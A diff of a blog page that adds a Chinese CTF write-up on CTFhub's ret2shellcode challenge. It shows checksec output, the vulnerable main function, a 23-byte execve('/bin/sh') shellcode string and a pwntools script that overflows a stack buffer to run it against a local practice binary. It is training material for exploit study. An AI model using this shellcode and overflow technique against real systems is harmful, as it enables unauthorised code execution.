@@ -154,17 +154,158 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap tags">
-                        
-                            <a href="https://shawr00t.github.io/HdcmhNKsB/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> pwn</i>
-                                </p>
-                            </a>
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                [CTFhub]ret2shellcode
+                            </h1>
                             
-                    </div>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        「配枪朱丽叶 - 分部。」
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-07-04</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.4
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">272</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>checksec：</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>main函数内容如下：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 buf; // [rsp+0h] [rbp-10h]
+  __int64 v5; // [rsp+8h] [rbp-8h]
+
+  buf = 0LL;
+  v5 = 0LL;
+  setvbuf(_bss_start, 0LL, 1, 0LL);
+  puts(&quot;Welcome to CTFHub ret2shellcode!&quot;);
+  printf(&quot;What is it : [%p] ?\n&quot;, &amp;buf, 0LL, 0LL);
+  puts(&quot;Input someting : &quot;);
+  read(0, &amp;buf, 0x400uLL);
+  return 0;
+}
+</code></pre>
+<p>bss段可写入：<br>
+<img src="https://imgpp.com/images/2021/07/04/603.png" alt="603.png" loading="lazy"><br>
+buf的地址在程序运行的时候会回显。buf变量的rbp为<code>0x10</code>，宽度为0x8，总共为24字节。<br>
+因此可以写入长度为23的shell：</p>
+<pre><code class="language-python">shell=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+</code></pre>
+<p>但是因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode。因此，buf_address的地址为<code>'a'*24+[buf_addr+32]+shellcode</code>。</p>
+<pre><code class="language-python">from pwn import *
+  
+io = process('./pwn')
+io.recvuntil('[')
+buf_address = int(io.recvuntil(']')[:-1],16)+0x10+0x8+0x8
+shell=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+payload = 'a'*0x10+'a'*0x8+p64(buf_address)+shell
+io.sendlineafter('someting : ',payload) 
+io.interactive()
+</code></pre>
+
+                        </div>
+                        
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>「配枪朱丽叶 - 分部。」</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://shawr00t.github.io/ctfhubret2shellcode/">https://shawr00t.github.io/ctfhubret2shellcode/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/ctfhubret2shellcode/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/ctfhubret2shellcode/&sharesource=qzone&title=[CTFhub]ret2shellcode&pics=https://shawr00t.github.io/images/avatar.png?v=1625394247302&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/ctfhubret2shellcode/&sharesource=weibo&title=[CTFhub]ret2shellcode + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625394247302 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                            <div class="reward ">
+                                                                <div class="reward-button ">&yen;
+                                                                    <span class="reward-code "> 
+                                                                <span class="alipay-code "> <img class="alipay-img " alt = "support " src="https://imgpp.com/images/2021/07/01/_20210702113052.jpg"><b>Alipay</b> </span>
+                                                                    <span class="wechat-code "> <img alt ="support " class="wechat-img " src="https://imgpp.com/images/2021/07/01/_20210702113049.png"><b>Wechat</b> </span> </span>
+                                                                </div>
+                                                            </div>
+                                                            
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
+                                                pwn
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/">
+                                                                                                    [PWN]ret2shellcode学习笔记
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -220,5 +361,8 @@
                 
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
